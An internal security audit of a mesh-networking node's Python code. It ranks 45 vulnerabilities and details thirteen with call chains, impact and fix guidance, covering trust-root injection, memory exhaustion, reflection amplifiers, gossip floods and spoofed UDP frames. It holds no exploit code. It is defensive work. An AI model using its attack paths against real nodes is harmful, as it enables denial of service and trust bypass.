# BUGSVULNS — audit of the execution flow

> **What this is.** A full pass following the *execution order* of the code, not
> the file order: from the byte arriving on a socket, through framing, the
> validation gates, the per-type handlers, the routing/gossip planes, the app
> layer, and out to the console and the apps. Every input is treated as hostile
> until a gate has proved it is not.
>
> **What this is not.** It is not a patch set. Nothing here has been changed.
> Each entry carries the context needed to fix it *without* breaking the
> mechanism it belongs to — the surrounding invariant is written down next to
> the defect, because several of these findings sit on paths whose fragility is
> already documented in `Docs/Architecture/gotchas.md`.
>
> Severity is about what an adversary gains, in the threat model of
> `CLAUDE.md`: the network, the peers and the transports are hostile, and an
> authenticated peer may still be an adversary.

> **Baseline.** Every finding below is present in a tree whose unit suite is
> green: `pytest --ignore=tests/integration` on this commit is
> **1882 passed, 8 skipped**. None of these is a broken test waiting to be
> noticed — they are all in the space the tests do not cover, which is the
> useful thing to know about them.

## How to read an entry

- **Where** — file and the function the defect lives in.
- **Reach** — the exact call chain from a network byte (or a console request)
  to the defect. This is what decides whether it is theoretical.
- **What happens** — the defect itself.
- **Impact** — what an adversary gets.
- **Fixing it without breaking something** — the invariant that must survive the
  fix, and the traps around it.

---

## Severity index

| # | Severity | Title |
|---|---|---|
| 1 | **critical** | A dialled peer can install itself as a trust root (`_handle_handshake_ack`) |
| 27 | **critical** | A chat file transfer can buffer gigabytes per peer |
| 2 | **high** | `_e2e_sessions` is unbounded, and every entry re-writes the whole session store |
| 3 | **high** | Pre-auth packets poison the replay-dedup cache before any rate limit |
| 4 | **high** | Unauthenticated links hold every peer slot for ever |
| 5 | **high** | `UDPServer._transports` is never pruned — 128 datagrams permanently kill UDP |
| 6 | **high** | UDP decode queue is unbounded; the reorder buffer is bounded in frames, not bytes |
| 7 | **high** | `MeshNode._data_queue` is unbounded |
| 8 | **high** | `CertStore` is unbounded and re-writes its whole file per certificate, on the loop |
| 9 | **high** | `RELEASE_FETCH` blocks the receive loop *and* reflects 48 KB to an unverified id |
| 10 | **high** | `DIR_FIND` has no rate limit and reflects up to 56 KB to an unverified id |
| 11 | **high** | A pseudo claim from a stranger is re-gossiped to every peer (network-wide amplifier) |
| 28 | **high** | Raw UDP punch probes buy an ML-DSA verify *and* a signature, unmetered |
| 29 | **high** | Any datagram with the STUN magic cookie rewrites our public address |
| 30 | **high** | Argument injection into `ssh` from a fleet provisioning request |
| 41 | **high** | The app-store catalogue can be filled and held for ever |
| 12 | **medium** | A corrupt identity file is silently replaced, then overwritten |
| 13 | **medium** | The UDP reliability layer is unauthenticated — one spoofed datagram wedges a link |
| 14 | **medium** | `_handle_reach_probe` dials back inside the receive loop (up to 6 s) |
| 15 | **medium** | Rate-limit tables are keyed by `id(peer)` |
| 16 | **medium** | A failed forward tears the target peer down inside the ingress receive loop |
| 17 | **medium** | Pre-auth `HANDSHAKE` may be retried without limit on one connection |
| 18 | **medium** | `RELAY_CARRY` / `INVITE_SEEK` give an unauthenticated peer a 16-hop mesh injector |
| 19 | **medium** | One peer's word sets `_inbound_schemes` (we advertise as a relay on its say-so) |
| 20 | **medium** | `_handle_store` has no rate limit; 128 MiB of LRU is an eviction lever |
| 21 | **medium** | `RELEASE_DATA` slices are accepted from anyone, poisoning an in-flight download |
| 31 | **medium** | Scan results choose where the operator's SSH password goes |
| 32 | **medium** | The invitation lockout is per connection, not per node |
| 33 | **medium** | `verify_assertion` burns the anti-replay nonce before checking the signature |
| 34 | **medium** | The console reads an unauthenticated body of up to 64 MiB (+ racy login throttle) |
| 35 | **medium** | HTML injection into the node view from a remote console |
| 36 | **medium** | `_e2e_pending_kem` / `_nonce` / `_attempt` are unbounded |
| 37 | **medium** | `DataConnector` counts only authenticated clients; one slow app stalls the data plane |
| 42 | **medium** | Enrolment requests are unmetered and can fill the pending table |
| 43 | **medium** | `RelayedTransport`'s inbox is unbounded and its `receive` uses `wait_for` |
| 22 | **low** | `_decode_chain` does not bound the certificate count |
| 23 | **low** | `RoutingTable._bucket_index(own_id)` indexes bucket `-1` |
| 24 | **low** | `SpoolServer` has no peer cap and an unbounded `_seen` set |
| 25 | **low** | `_note_release_source` bounds the outer table with the inner constant |
| 26 | **low** | `PseudoBook.offer` drains a bucket with an unbounded `while` |
| 38 | **low** | A corrupt console credential silently resets the password |
| 39 | **low** | `_build_ssl_context` can pair a stale certificate with a fresh key |
| 40 | **low** | A signed app release can declare a million chunks |
| 44 | **low** | `PUNCH_REQUEST` is unmetered and sends two packets per request |
| 45 | **low** | Fire-and-forget tasks that are neither tracked nor bounded |

### Themes

Four patterns produce most of the list, and each is worth fixing as a pattern
rather than one site at a time:

1. **A bound exists next door but not here.** `_e2e_rekey` is bounded and
   `_e2e_sessions` is not (**2**); `_reorder` is bounded and `_decoded` is not
   (**6**); `_handle_find_value` has a rate valve and `_handle_store` and
   `_handle_dir_find` do not (**20**, **10**); `_e2e_pending_data` respects
   `_MAX_PENDING_TARGETS` and the three tables beside it do not (**36**).
2. **State is mutated before the gate that should have stopped it.** The dedup
   cache is written before the rate limit (**3**); the anti-replay nonce is
   burnt before the signature check (**33**); the console reads the body before
   the session check (**34**).
3. **Slow work inside a receive loop.** `gotchas.md` §10 names this as the
   trap, and four handlers still do it: `_handle_release_fetch` (**9**),
   `_handle_reach_probe` (**14**), `_send_to_candidates`' teardown (**16**), and
   the gossip fan-out (**P17**) — plus the synchronous `fsync` in
   `_persist_state` (**P8**) and `_cert_add` (**P9**).
4. **A check that is written but not wired.** The invite lockout exists and is
   never called (**32**); the STUN transaction id is validated against itself
   (**29**); `remove_transport` exists and is never called (**5**).

Performance findings are listed separately, from **P1** onwards, after the
security section.

---

## 1 — critical — A dialled peer can install itself as a trust root

> **Status — fixed.** `_Peer.joined_by_invite` is set only by
> `_handle_invite_ack` on an accepted code, and `_handle_handshake_ack`
> now requires it before the `issued_cert` branch can adopt a root.
> Locked down by `test_dialled_peer_cannot_plant_a_trust_root`, with
> `test_joining_by_invite_still_adopts_the_host_root` beside it.

**Where** — `src/node.py`, `MeshNode._handle_handshake_ack` (the
`if issued_cert is not None:` branch).

**Reach** — anything that opens an outgoing link: `_dial_uri` (used by
`_connect_routing`, `_maintain_neighbors`, `_address_retry_loop`,
`_steer_pass`, `console_retry_addresses`) → `_Peer` with
`is_client_side=True` → the peer's `CHALLENGE` → `_handle_challenge` →
`initiate_handshake` → the peer answers with `HANDSHAKE_ACK` →
`_handle_handshake_ack`.

**What happens** — the branch is chosen by *the remote side*: it fires whenever
the `HANDSHAKE_ACK` carries an `issued_cert`, never because *we* recorded that
we joined by invitation. The only checks on that certificate are
`issued_cert.issuer_id == server_id` and `issued_cert.subject_id == self._id` —
both trivially satisfiable by the peer, which has just received our DSA public
key inside our own `HANDSHAKE` and can therefore mint a certificate naming us
as subject. The branch then runs:

```python
if server_chain:
    last = server_chain[-1]
    if last.is_self_signed:
        self._cert_store.add_root(last.subject_id)
```

so the peer's own self-signed certificate becomes a **trusted root**, and
`self._cert_add(issued_cert)` persists the store (roots included) to disk.

`initiate_handshake` keeps no memory of whether a code was ever presented:
`_handle_invite_ack` clears `peer.join_code = None` *before* calling it, so by
the time the ACK arrives there is nothing left that distinguishes "I joined
this node with a code" from "I dialled this address because gossip mentioned
it".

**Impact** — full bypass of the invitation gate, permanently and persistently.
Once the attacker's root is in `_roots`, `CertStore.verify_chain` accepts every
chain anchored there, so the attacker can mint identities at will and each one
passes:

- `_handle_handshake` (`verify_chain(chain)` → link authentication with no code),
- `_handle_e2e_handshake` / `_ack` (end-to-end sessions),
- `_handle_found_node` (routing entries accepted into `RoutingTable`).

Getting dialled is cheap: a single hostile member advertising sybil
`NodeEntry`s through `FOUND_NODE`, or `advertised_uris` in a `PING`, is enough
for `_maintain_neighbors` / `_address_retry_loop` to dial them. It also means a
node that merely *probes* an address (`console_retry_addresses`, address
steering) hands over its trust anchor set.

**Fixing it without breaking something** — the invariant to keep is the one
`Docs/Architecture/security.md` states: a root is adopted **because we
presented a code and it was accepted**, which is exactly the moment
`_handle_invite_ack` sees `_ACK_ACCEPTED`. Carry that decision forward on the
peer (e.g. a `peer.joined_by_invite` flag set there, or keep `join_code` and
clear it only after the ACK is processed) and take the `issued_cert` branch
only when it is set. Everything else must stay: the reconnect path
(`peer.join_code is None` → `initiate_handshake`) legitimately presents a chain
and must keep going through `verify_chain`, and a node joining by invitation
must still end up with the inviter's root — otherwise the very first join
produces a member that can never verify anybody.

Watch out for two related paths while fixing:

- `_start_relay_invite` builds a virtual peer with `is_client_side=False`, so
  the *inviter* side is unaffected; the joiner side goes through
  `_relay_join_one`, which must also mark the link as invite-driven or the
  relayed join stops adopting the root it needs.
- `tests/test_invite_to_handshake.py` and `tests/test_relay_invite.py` cover
  the accepted flow; a regression test for this bug belongs beside them (dial a
  node with no code, have it answer with a forged `issued_cert`, assert
  `_cert_store.is_root(attacker) is False`).

---

## 2 — high — `_e2e_sessions` is unbounded, and each new entry re-writes the store

> **Status — partly fixed.** `_keep_e2e_session` bounds the table
> (`_MAX_E2E_SESSIONS`, LRU, never evicting a target with data queued) and
> `_forget_e2e` drops all four tables together. The persistence half — the
> synchronous fsync per handshake — is **P8**, in the receive-loop pass.

**Where** — `src/node.py`, `MeshNode._handle_e2e_handshake` /
`_handle_e2e_handshake_ack` / `_handle_data`, and `MeshNode._persist_state`.

**Reach** — `_handle_packet` → `_ROUTABLE_TYPES` gate (needs *a* live
authenticated link, not that `src_id` is that link) → `_handle_e2e_handshake`.

**What happens** — `self._e2e_sessions: dict[NodeID, SessionKey]` has no
ceiling and no expiry. `_handle_e2e_handshake` writes one entry per distinct
`src_id` that presents a chain to a root. `src_id` is *not* the authenticated
peer — it is whatever the packet claims, checked only against the DSA key
inside the payload (`NodeID.from_public_key(dsa_pub) != src`), so an adversary
generates a fresh key pair per handshake and gets a fresh entry every time.
`_e2e_pending_kem`, `_e2e_pending_nonce` and `_e2e_attempt` are equally
unbounded (see **36**). `_e2e_pending_data` is the one table that *is* bounded, by
`send_data`.

Every one of those handshakes also calls `_persist_state()`, which is
`SessionStore.save(...)` — a synchronous serialise-encrypt-write of the
*entire* session table plus `self._routing.export_entries()`, on the event
loop. Cost per handshake is therefore O(number of sessions), so N handshakes
cost O(N²) of blocking disk I/O.

**Impact** — memory exhaustion plus a self-amplifying event-loop stall. It also
degrades before it exhausts: once the store is a few megabytes, every E2E
handshake freezes the loop for the duration of a full encrypt-and-write.

Note the asymmetry with the code right beside it: `_e2e_rekey` *is* bounded
(`_E2E_REKEY_MAX`, `_E2E_REKEY_TTL`) precisely because the comment there
reasons about "a flood of valid-but-useless handshakes". The primary table has
the same exposure and none of the bound.

**Fixing it without breaking something** — bound `_e2e_sessions` (LRU with a
ceiling, and an idle TTL), and evict the companion tables with it —
`_MAX_PENDING_TARGETS` already exists and already governs
`_e2e_pending_data`; the other three ignore it (**36**). Two traps:

- eviction must not be able to drop a session that has data queued for it, or
  `_e2e_retry_loop` will re-handshake in a loop; evict by last use and skip
  targets present in `_e2e_pending_data`.
- do **not** make `_persist_state` async-with-await inside the handlers: they
  run in a receive loop (see gotcha §10). The right shape is to mark the state
  dirty and let one bounded background task write at most every N seconds —
  `_release_loop` is the pattern already in the file.

---

## 3 — high — Pre-auth packets poison the replay-dedup cache before any rate limit

> **Status — fixed.** `_seek_allowed` / `_carry_allowed` now run above
> `_is_seen` in both handlers; `msg_id` verification still precedes dedup and
> the ML-DSA check is still last.

**Where** — `src/node.py`, `MeshNode._handle_invite_seek` and
`MeshNode._handle_relay_carry`; the cache is `MeshNode._is_seen`.

**Reach** — `_Peer._loop` → `_handle_packet`. `INVITE_SEEK` and `RELAY_CARRY`
are dispatched **before** the authentication gates, by design (they are the
pre-auth relayed-invitation plane). Any TCP/UDP connection to the node reaches
them without authenticating.

**What happens** — the order of the checks is:

```python
if packet.ttl <= 0: return
if packet.msg_id != packet.compute_msg_id(): return
if self._is_seen(packet.msg_id): return      # <- inserts into _seen_msgs
if not self._seek_allowed(peer): return      # <- rate limit, too late
```

`_is_seen` is not a query: it inserts. So the per-link rate limit
(`_SEEK_RATE_MAX = 20` / `_CARRY_RATE_MAX = 256` per 10 s) is applied *after*
the packet has already consumed a slot in the shared, node-wide dedup table.
`_MSG_DEDUP_MAX` is 10 000 and eviction is FIFO.

**Impact** — an unauthenticated peer can flush the whole replay-dedup window at
line rate: 10 000 crafted `INVITE_SEEK` packets (each with a correct `msg_id`,
which the attacker computes) evict every legitimate entry. Deduplication is
what stops a routed packet from looping and what stops a relay re-injecting the
same payload (`Docs/Architecture/protocol.md`, "bounded deduplication"). With
the window emptied on demand, the only surviving anti-loop is TTL — so a
forwarded packet can be replayed around the mesh up to its TTL each time,
which is a straight multiplier on any flood.

**Fixing it without breaking something** — move the rate-limit check above
`_is_seen` in both handlers. The remaining ordering constraints in
`_handle_invite_seek` matter and must be preserved: `msg_id` verification stays
before dedup (a packet whose id does not commit to its content must never
occupy a slot), and the expensive ML-DSA verification stays *last*. Consider
also giving the pre-auth planes their own small dedup table rather than sharing
the routed one, so a pre-auth flood cannot reach post-auth state at all.

---

## 4 — high — Unauthenticated links hold every peer slot for ever

> **Status — fixed.** `_MAX_UNAUTH_PEERS` gives unauthenticated links their
> own, smaller ceiling, and `_reap_stale_unauthenticated` cuts one past
> `_HANDSHAKE_DEADLINE`. Relayed virtual peers are exempt, as a relayed join
> needs them.

**Where** — `src/node.py`, `MeshNode._on_new_transport`; the ceiling is
`_MAX_PEERS = 128`.

**Reach** — `TCPServer._accept` (or `UDPServer._dispatch_datagram`) →
`transport_manager.on_new_connection` → `_on_new_transport`.

**What happens** — the only admission test is `len(self._peers) >= _MAX_PEERS`.
A peer is appended, a `CHALLENGE` is sent, and nothing ever checks that the
handshake completes. There is no deadline on `pending_challenge`, no separate
budget for unauthenticated links, and no per-source-address limit.

The transport read timeout is the only reaper (`TCP _READ_TIMEOUT = 60 s`), and
it is trivially defeated: any packet keeps the link alive, including one the
gates drop immediately (a `PING` from an unauthenticated peer returns at the
first gate but has already reset the read timer). One byte-cheap packet every
30 s per connection holds a slot indefinitely.

**Impact** — 128 connections from one host deny every future inbound *and*
outbound link: `_dial_uri` refuses to dial at all once `len(self._peers) >=
_MAX_PEERS` (`_note_dial(..., "peer limit")`), so the node cannot even re-join
the mesh. Cost to the attacker is 128 idle sockets.

**Fixing it without breaking something** — two additions, kept separate:

- a handshake deadline per link (drop a peer whose `authenticated_id` is still
  `None` after a few seconds), enforced by a bounded sweep rather than a
  per-peer timer task;
- a sub-ceiling on *unauthenticated* peers so they can never crowd out
  authenticated ones, and a small per-remote-IP cap.

Traps: `_Peer.stop()` must be used, not `_reap_peer`, when cutting from outside
the peer's own task (see the comment on `_reap_peer`), and the relayed virtual
peers created by `_start_relay_invite` also live in `self._peers` and legitimately
sit unauthenticated for the length of a relayed invite — give them a longer
grace or exempt them explicitly, or relayed joins will start failing.

---

## 5 — high — `UDPServer._transports` is never pruned

> **Status — fixed.** `remove_transport` is called on close and on the
> keepalive's death verdict, and `_reap_closed` sweeps when the table is read,
> so the ceiling counts live transports.

**Where** — `src/udp_transport.py`, `UDPServer._dispatch_datagram` /
`UDPServer.remove_transport`.

**Reach** — any datagram whose first four bytes are `NUDP`, from any source
address.

**What happens** — `_dispatch_datagram` creates one `UDPTransport` per distinct
`(ip, port)` and stores it in `self._transports`, capped at `_MAX_PEERS_UDP =
128`. `remove_transport` exists to evict — and **is never called** anywhere in
the tree (`grep -rn remove_transport src/ tests/` returns only its definition).
Closed transports stay in the table for the life of the process, and the
admission test runs before the replacement path:

```python
transport = self._transports.get(addr)
if transport is None or transport._closed:
    if len(self._transports) >= _MAX_PEERS_UDP:
        return                       # <- also blocks *replacing* a dead entry
```

**Impact** — 128 datagrams from 128 distinct source ports (spoofable; they need
carry nothing but the 4-byte magic) permanently disable the UDP transport:
no new UDP peer can be accepted, and a legitimate peer whose transport died
cannot be re-accepted either. It also disables the UDP-side of NAT hole
punching, which is what NATted nodes depend on.

**Fixing it without breaking something** — call `remove_transport(addr)` when a
transport closes (`UDPTransport.close`, and the keepalive-timeout path in
`_keepalive_loop` which sets `_closed = True` without telling anyone), and
allow a closed entry to be replaced in place before the ceiling test. Keep the
ceiling — it is the memory bound — but make it count *live* transports.

Trap: `UDPTransport._from_server` shares the server's socket
(`_owns_socket = False`); evicting an entry must not close that socket. And the
punch path (`_complete_punch`) reaches into `UDPServer._transports`, so check
its expectations before changing the table's lifetime.

---

## 6 — high — UDP decode queue unbounded; reorder buffer bounded in frames, not bytes

> **Status — fixed.** `_MAX_REORDER_BYTES` and `_MAX_DECODED_BYTES` bound both
> buffers in bytes; overflow drops (the callback is synchronous and must not
> block). `receive()` now waits on an event instead of polling, which also
> closes **P4**.

**Where** — `src/udp_transport.py`, `UDPTransport._process_frame` (appends to
`self._decoded`) and `_ReliableLink.process_incoming` (fills `self._reorder`).

**Reach** — `_DatagramProtocol.datagram_received` → `feed_datagram` →
`_process_frame`. No authentication is involved: this is below the mesh layer.

**What happens** — two separate missing bounds.

- `self._decoded: list[Packet]` grows on every in-order delivery and is drained
  only by `UDPTransport.receive()`. Nothing couples the two: a sender that
  pushes frames faster than `_Peer._loop` processes them (or a transport whose
  consumer never started — `_dispatch_datagram` calls `feed_datagram`
  immediately, while `on_new_connection` runs in a *separate* task) grows the
  list without limit. Each entry can be a 60 000-byte payload.
- `self._reorder` is capped at `max_reorder` **frames** (default 256, operator
  settable to 1024), not bytes. Each frame can carry 60 000 bytes, so one link
  can hold 15 MB (60 MB at the maximum setting) of attacker-chosen data by
  sending frames whose sequence numbers are ahead of the cursor and never
  filling the gap. Multiply by `_MAX_PEERS_UDP = 128`.

**Impact** — memory exhaustion from an unauthenticated source, which is exactly
what `CLAUDE.md` §2 ("bounds everywhere", "no memory exhaustion") rules out.
The reorder case is the cheaper one for the attacker: no session, no handshake,
just datagrams with the right magic.

**Fixing it without breaking something** — bound `_decoded` in bytes and drop
(or close the link) past the ceiling, and add a byte budget alongside
`max_reorder` in `process_incoming`. Do not convert `_decoded` into an
`asyncio.Queue` with back-pressure in `_process_frame`: that function is called
from `datagram_received`, a *synchronous* protocol callback, and must not
block. A bounded `collections.deque` with an explicit byte counter keeps the
existing shape (and fixes the `pop(0)` cost noted in **P4**).

---

## 7 — high — `MeshNode._data_queue` is unbounded

> **Status — fixed.** `maxsize=_MAX_DATA_QUEUE`, and `_handle_data` drops with
> `Counters.on_drop()` rather than awaiting — awaiting a full queue inside the
> receive loop would freeze the link.

**Where** — `src/node.py`, `MeshNode.__init__`
(`self._data_queue: asyncio.Queue = asyncio.Queue()`) and `_handle_data`.

**Reach** — `_handle_packet` → `DATA` → `_handle_data` → `await
self._data_queue.put((src, plaintext))`. Reached by any node holding an E2E
session with us.

**What happens** — `asyncio.Queue()` with no `maxsize`. The only consumer is
`receive_data()`, which the data connector calls. If no connector is attached,
or the app behind it is slower than the sender, the queue grows without limit,
each item up to ~60 000 bytes of decrypted payload.

**Impact** — memory exhaustion by an authenticated peer, and a silent one: no
counter moves, no log line. A node running with no app attached (the default
for a pure relay) has *no* consumer at all.

**Fixing it without breaking something** — give the queue a `maxsize` and drop
on overflow rather than awaiting: `_handle_data` runs inside `_Peer._loop`, so
an `await put()` that blocks on a full queue freezes the ingress link (gotcha
§10 again). Dropping is the correct behaviour here — the E2E layer offers no
delivery guarantee and the app layer already has to tolerate loss.

---

## 8 — high — `CertStore` is unbounded and re-writes its whole file per certificate

**Where** — `src/cert_store.py`, `CertStore.add` / `CertStore.save`;
`src/node.py`, `MeshNode._cert_add`.

**Reach** — three network paths add certificates:
`_handle_handshake` (`for cert in chain: self._cert_add(cert)`),
`_handle_handshake_ack` (same), and `_handle_found_node`
(`for cert in entry.cert_chain: self._cert_add(cert)`).

**What happens** — `CertStore.add` appends to `self._certs[subject_id]` with no
ceiling on the number of subjects or the number of certificates per subject; it
only de-duplicates on an exact signature match. `MeshNode._cert_add` then does:

```python
if ok and self._cert_store_path:
    self._cert_store.save(self._cert_store_path)
```

and `save` serialises the *entire* store to JSON (hex-encoded, so roughly twice
the certificates' binary size) and writes it — synchronously, on the event
loop, once per certificate.

**Impact** — three compounding effects:

1. unbounded memory and disk growth driven by the network;
2. O(N) blocking disk I/O per certificate added, so absorbing a chain of 6
   certificates re-writes a multi-megabyte file 6 times, in a receive loop;
3. `CertStore.get_chain_to_root` is a BFS over this graph and is called once
   **per candidate entry** in `_handle_find_node` (up to `_FIND_NODE_SCAN =
   64`), so a bloated store turns every `FIND_NODE` — a 28-byte packet — into
   an unbounded graph walk.

Point 3 is the sharp end: it converts a memory-growth nuisance into a CPU
amplifier that any authenticated peer can pull, 512 times per 10 s window
(`_QUERY_RATE_MAX`).

**Fixing it without breaking something** — bound the store (per subject and in
total, LRU on subjects, but *pin the roots and our own chain* so eviction can
never make us unable to authenticate), batch the persistence (dirty flag +
periodic write, off the loop), and memoise `get_chain_to_root` per subject with
an invalidation on `add`. The invariant to keep is the one in
`cert_store.py`'s docstring: `get_chain_to_root` must keep preferring an
*external* root, because our own self-signed root authenticates nothing to a
peer.

---

## 9 — high — `RELEASE_FETCH` blocks the receive loop and reflects 48 KB to an unverified id

> **Status — partly fixed.** `blocking=False`, as every sibling handler does,
> so the link no longer freezes. The reflection half is in the rate-limit pass.

**Where** — `src/node.py`, `MeshNode._handle_release_fetch`.

**Reach** — `_handle_packet` → `_ROUTABLE_TYPES` → `_handle_release_fetch`
(any authenticated peer; `src_id` inside the packet is *not* authenticated).

**What happens** — two defects in the same three lines:

```python
await self._route_outbound(Packet.create(
    RELEASE_DATA, self._id.raw, packet.src_id,
    payload[:_RELEASE_ID_LEN] + offset.to_bytes(4, "big") + slice_))
```

- `_route_outbound` is called **without `blocking=False`**. Every other handler
  in the file passes it (`_handle_find_node`, `_handle_find_value`,
  `_handle_dir_find`, `_handle_e2e_handshake`, `_handle_echo_request`) with the
  comment "never inline, we are in a receive loop". Here it is missing, so when
  no route exists the handler awaits `_ensure_route_to` — a Kademlia lookup plus
  a dial plus a hole punch, up to `_ON_DEMAND_TIMEOUT` — inside `_Peer._loop`.
  This is precisely the failure documented in `gotchas.md` §10 (measured there
  at 4.95 s of frozen link per unroutable packet).
- the reply is addressed to `packet.src_id`, which no gate verifies, and
  carries `_RELEASE_SLICE = 48 KiB`. The request is 79 + 24 = 103 bytes.

**Impact** — a ~475× reflection amplifier aimed at any node id the attacker
names, rate-limited only by `_RELEASE_SERVE_MAX = 64` per 10 s **per ingress
link** (≈ 307 kB/s per link, and an attacker may hold many links); and, with a
src_id that has no route, a permanent freeze of the attacker-chosen ingress
link — 64 requests × up to 5 s each, in a 10 s window.

**Fixing it without breaking something** — pass `blocking=False`, as the sibling
handlers do. Keep serving to `packet.src_id`: a release fetch legitimately
arrives from a node several hops away, and the reply has to route back (that is
why `RELEASE_FETCH`/`RELEASE_DATA` are in `_ROUTABLE_TYPES`). To close the
reflection, prefer answering back down the link the request arrived on (the
`_route_hints` reverse path already records it) and, failing that, drop rather
than acquire a route for a stranger's slice.

---

## 10 — high — `DIR_FIND` has no rate limit and reflects up to 56 KB

**Where** — `src/node.py`, `MeshNode._handle_dir_find`;
`src/pseudo_dir.py`, `encode_claims` (`_FOUND_BUDGET = 56 * 1024`).

**Reach** — `_handle_packet` → `_ROUTABLE_TYPES` → `_handle_dir_find`.

**What happens** — `_dir_allowed` (the `_DIR_RATE_MAX = 128` per-window limit)
is applied to `_handle_dir_store` only. `_handle_dir_find` has **no** rate
limit — unlike `_handle_find_node` and `_handle_find_value`, which both call
`_query_allowed` with the comment "each buys … a reply many times the size of
the question, sent to an unverified src_id". The directory reply is exactly
that: 28 bytes of payload in, up to 56 KiB of claims out, to `packet.src_id`.

Filling a key's bucket is cheap for the attacker: `_MAX_PER_KEY = 8`, and a
claim is ~5.3 KB (ML-DSA-65 public key + signature), so eight self-registered
identities under one name give ~42 KB per reply.

**Impact** — ~400× reflection amplification with no per-link ceiling, pointed
at any node id. Combined with **9**, a hostile member has two independent
amplifiers into the mesh.

**Fixing it without breaking something** — route `_handle_dir_find` through
`_query_allowed` (the same valve `FIND_NODE`/`FIND_VALUE` use, with the
measured-peak caveat in `gotchas.md` §12 — do not set a new, tighter bound for
this plane without measuring the legitimate peak of `lookup_pseudo`, which
issues `_DIR_K + len(direct peers)` queries in parallel). `_handle_dir_find`
already passes `blocking=False`, which is correct; keep it.

---

## 11 — high — A stranger's pseudo claim is re-gossiped to every peer

**Where** — `src/node.py`, `MeshNode._handle_pseudo_announce` →
`_gossip_pseudo`; the same shape in `_handle_catalog_announce` →
`_gossip_catalog` and `_handle_release_announce` → `_gossip_release`.

**Reach** — `_handle_packet` → `_DIRECT_TYPES` → `_handle_pseudo_announce`
(authenticated immediate peer, but the *claim* comes from anyone).

**What happens** — `_absorb_claim` returns non-`None` whenever the claim
"changed our view", and `PseudoBook.offer` says a claim is new when its node id
is unknown. A node id is `sha256(dsa_pub)[:20]`, so an adversary mints an
unlimited supply of *cryptographically valid* new identities offline. Each one
is therefore new, each one triggers:

```python
for p in list(self._peers):
    ...
    await p.send(pkt)          # ~5.3 kB to every authenticated peer
```

and every receiving node repeats the judgement and re-gossips in turn. The
per-link valve (`_PSEUDO_RATE_MAX = 64` per 10 s) bounds the *ingress* of one
link, not the fan-out: 6.4 accepted claims/s on one link become 6.4 × (peers −
1) sends here, and an epidemic across the mesh.

**Impact** — a network-wide flood amplifier driven by a single authenticated
link, plus complete eviction of the legitimate contents of `PseudoBook`
(bounded at `_MAX_NODES = 1024` / 4 MiB, global LRU) — every real name on the
mesh can be pushed out on demand.

**Fixing it without breaking something** — the terminating property of the
epidemic ("re-gossip only when our view changed") is correct and must be kept;
what is missing is a bound on how many *new identities* one link may introduce
per window, and a bounded gossip fan-out (a random subset of peers rather than
all of them, in the shape of `_ANNOUNCE_FANOUT = 5`). Also consider requiring
that a claimed node id be one we have some other reason to know (present in
`RoutingTable`, or a live peer) before re-serving it — display names for nodes
that do not exist have no use, and that single condition removes the free
supply of "new" claims.

The `await p.send(...)` inside the handler is itself a hazard: it runs in the
ingress peer's receive loop, so one slow peer's TCP back-pressure stalls the
sender's link. `_spawn_bounded` already exists for exactly this and is used by
`_announce_own_pseudo`.

---

## 12 — medium — A corrupt identity file is silently replaced, then overwritten

**Where** — `src/crypto.py`, `CryptoIdentity.load`; `src/node.py`,
`MeshNode.__init__`.

**Reach** — node start-up: `CryptoIdentity.load(identity_path)` immediately
followed by `self._identity.save(identity_path)`.

**What happens** — `load` wraps the whole parse in
`except (FileNotFoundError, Exception)` and, on *any* failure, generates a brand
new key pair. `__init__` then writes that new key over the existing file. A
truncated write, a bad sector, a partially-restored backup — anything that makes
`struct.unpack_from` or `oqs.Signature(DSA_ALG, secret)` raise — destroys the
node's identity permanently and irrecoverably.

There is also no consistency check between the stored public half and the
secret: `identity._dsa_public = pub` is taken verbatim. A file whose `pub_len`
is 0, or whose public half belongs to a different key, produces a node whose
`NodeID` does not match its signing key — every signature it makes is
unverifiable and every peer rejects it (`claimed_id != NodeID(packet.src_id)`),
with no diagnostic anywhere.

**Impact** — silent identity loss (all certificates, all memberships, the
node's place in every peer's routing table), and a failure mode that looks like
a network problem. It is also a *destruction* primitive for anyone with write
access to the state directory: truncate `node.key` and the node re-keys itself
on the next start.

**Fixing it without breaking something** — keep "no file → generate", which is
the first-run path and must stay. Change "file present but unreadable" into a
hard failure that does **not** write. Add a self-test after load (sign a fixed
message and verify it under the loaded public key) so an inconsistent pair is
caught at start rather than in the field. The 0600-at-open behaviour in `save`
is correct and documented — do not turn it back into a `chmod`.

---

## 13 — medium — The UDP reliability layer is unauthenticated

> **Status — mitigated, not closed.** Sequence numbers start random and the
> receiver learns the peer's from the first frame, so the cursor is no longer a
> free guess; an undelivered-but-delivered payload is counted (`undecodable`)
> instead of vanishing. The header is still unauthenticated — closing that
> means carrying the link session down into the transport, which is a design
> change, not a fix.

**Where** — `src/udp_transport.py`, `_ReliableLink.process_incoming` /
`process_ack`, `UDPTransport._process_frame`.

**Reach** — any datagram to the node's UDP port with source address spoofed to
that of an existing peer.

**What happens** — the mesh `Packet` inside a frame is authenticated (AES-GCM
under the link session), but the *frame* around it is not: sequence number,
ack, sack and flags are plaintext and unauthenticated, and the dispatch table
is keyed purely on `(ip, port)`. So an attacker who knows both endpoints of a
UDP link — and endpoints are gossiped in the clear via `advertised_uris` and
`FOUND_NODE`, so every mesh member knows them — can:

- **advance the delivery cursor.** A spoofed frame with `seq == _recv_next` and
  a garbage payload is delivered, `Packet.unpack` fails, the exception is
  swallowed (`except Exception: pass`), and `_recv_next` has moved. The real
  peer's next frame now looks like a duplicate ("behind the cursor") and is
  dropped. Sequence numbers start at 0 and increment, so they are predictable.
- **drop the sender's retransmit state.** `process_ack` runs before any flag
  test, so a spoofed ack/sack silently clears `_unacked` entries that were never
  delivered.
- **keep a dead link alive.** `process_incoming` sets `_last_recv_time`, which
  is what `is_alive()` reads, so a link whose real peer is gone never times out.

**Impact** — an authenticated, encrypted link between two third parties can be
wedged permanently by an off-path attacker with no key material, at the cost of
one datagram per sequence number. The mesh's own retry (`_e2e_retry_loop`,
`_link_keepalive_loop`) does not recover it, because the transport keeps
reporting the link as alive.

**Fixing it without breaking something** — the clean fix is to authenticate the
frame header once a session exists (the link session key is available at the
`_Peer` level, not at the transport level, so this needs a small hook rather
than a change inside `_ReliableLink`). A cheaper mitigation that preserves the
current shape: randomise the initial sequence number, and treat "a delivered
payload that fails `Packet.unpack`" as a link fault (count it, and do not let it
advance the cursor silently). Keep the modular-distance reasoning in
`process_incoming` intact — it is what fixed the 2³² wrap (gotcha §8), and a
"seen set" must not come back.

---

## 14 — medium — `_handle_reach_probe` dials back inside the receive loop

